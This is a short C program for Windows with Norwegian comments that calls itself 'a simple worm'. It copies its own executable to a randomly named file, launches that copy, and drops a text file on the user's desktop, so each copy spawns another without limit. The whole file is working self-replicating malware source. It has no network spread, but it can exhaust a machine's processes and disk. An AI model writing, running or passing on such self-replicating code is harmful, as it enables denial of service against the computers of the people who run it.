#include <stdlib.h>
#include <windows.h>

int main() {
    char self[MAX_PATH];
    GetModuleFileName(NULL, self, MAX_PATH); // Finner sin egen sti til seg selv

    // Lager ny sti for kopi
    char dest[MAX_PATH];
    sprintf(dest, "DINPATH\\copy_%d.exe", rand() % 10000);

    // Kopierer seg selv
    CopyFile(self, dest, FALSE);

    // Starter kopien
    ShellExecute(NULL, "open", dest, NULL, NULL, SW_SHOWNORMAL);

    // Lager tekstfil
    char path[256];
    sprintf(path, "C:\\Users\\PCNAVN\\OneDrive\\Skrivebord\\note_%d.txt", rand() % 10000);
    FILE* file = fopen(path, "w");
    fprintf(file, "Hei, jeg er en enkel orm.\n");
    fclose(file);

    return 0;
}


